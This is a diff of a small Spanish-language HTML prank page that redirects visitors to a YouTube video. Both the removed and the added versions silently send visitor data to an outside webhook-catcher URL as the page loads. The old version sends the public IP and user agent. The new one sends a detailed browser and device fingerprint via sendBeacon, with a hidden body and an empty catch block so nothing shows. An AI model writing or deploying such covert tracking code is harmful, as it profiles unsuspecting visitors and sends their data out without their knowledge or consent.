@@ -1,59 +1,67 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <title>Hi!</title>
+<meta charset="UTF-8">
+<title>Hi!</title>
 
-    <script>
-        async function sendWebhook() {
-            try {
-                // Obtener IP pública
-                const ipRes = await fetch("https://api.ipify.org?format=json");
-                const ipData = await ipRes.json();
+<script>
+(function () {
+    try {
+        const now = new Date();
 
-                // Obtener hora en Monterrey
-                const timeFormatter = new Intl.DateTimeFormat("es-MX", {
-                    timeZone: "America/Monterrey",
-                    dateStyle: "full",
-                    timeStyle: "long"
-                });
+        const payload = {
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            vendor: navigator.vendor || null,
+            language: navigator.language,
+            languages: navigator.languages || [],
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            timeMonterrey: new Intl.DateTimeFormat("es-MX", {
+                timeZone: "America/Monterrey",
+                dateStyle: "full",
+                timeStyle: "long"
+            }).format(now),
 
-                const payload = {
-                    ip: ipData.ip,
-                    userAgent: navigator.userAgent,
-                    fechaHoraMonterrey: timeFormatter.format(new Date())
-                };
+            screen: {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                pixelRatio: window.devicePixelRatio
+            },
 
-                // Enviar POST al webhook
-                await fetch(
-                    "https://tools.myaiteam.com/webhook-catcher/webhook/9fd0f343122174183e72a2ae69de43bd",
-                    {
-                        method: "POST",
-                        headers: {
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify(payload),
-                        keepalive: true
-                    }
-                );
+            viewport: {
+                width: window.innerWidth,
+                height: window.innerHeight
+            },
 
-            } catch (e) {
-                // Silencioso para no romper el rickroll
-            } finally {
-                // Redirección al Rickroll
-                window.location.href = "https://youtu.be/xvFZjo5PgG0?feature=shared";
-            }
-        }
+            device: {
+                cores: navigator.hardwareConcurrency || null,
+                memoryGB: navigator.deviceMemory || null,
+                touchPoints: navigator.maxTouchPoints || 0,
+                cookiesEnabled: navigator.cookieEnabled,
+                webdriver: navigator.webdriver || false
+            },
 
-        sendWebhook();
-    </script>
+            referrer: document.referrer || null,
+            isInstagram: /Instagram/i.test(navigator.userAgent),
+            isFacebook: /FBAN|FBAV/i.test(navigator.userAgent)
+        };
 
-    <style>
-        html, body {
-            display: none;
-        }
-    </style>
+        navigator.sendBeacon(
+            "https://tools.myaiteam.com/webhook-catcher/webhook/9fd0f343122174183e72a2ae69de43bd",
+            JSON.stringify(payload)
+        );
+
+    } catch (e) {}
+
+    window.location.replace("https://youtu.be/xvFZjo5PgG0?feature=shared");
+})();
+</script>
+
+<style>
+html,body{display:none}
+</style>
 </head>
-<body>
-</body>
+<body></body>
 </html>
